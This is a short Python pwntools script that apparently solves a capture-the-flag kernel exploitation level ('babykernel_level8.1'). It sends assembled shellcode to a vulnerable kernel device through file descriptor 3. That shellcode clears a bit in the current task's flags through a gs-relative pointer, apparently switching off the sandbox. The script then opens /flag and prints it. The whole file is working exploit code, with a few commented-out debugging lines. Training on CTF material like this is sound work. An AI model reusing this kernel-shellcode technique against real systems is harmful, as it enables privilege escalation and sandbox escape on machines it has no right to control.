from pwn import *
import os
import fcntl


context.arch = "amd64"
ker_byte_codes = asm('''
mov rbx, gs:[0x15d00]
and qword ptr[rbx], 0xfffffffffffffeff
ret                     
''')
byte_codes = asm(shellcraft.write(3, ker_byte_codes, len(ker_byte_codes)) + shellcraft.open("/flag", 0) + shellcraft.sendfile(1, "rax", 0, 0x66))
p = process("/challenge/babykernel_level8.1")
# context.terminal = ['tmux', 'splitw', '-h']  # Attempting to use multixterm
# p = gdb.debug(["/challenge/babykernel_level8.0"], gdbscript="source /opt/gef/gef.py")

p.send(byte_codes)

all = p.recvall()
print(all.decode())
# fd1 = os.open("/flag", 0)
# os.sendfile(1, fd1, 0, 0x40)
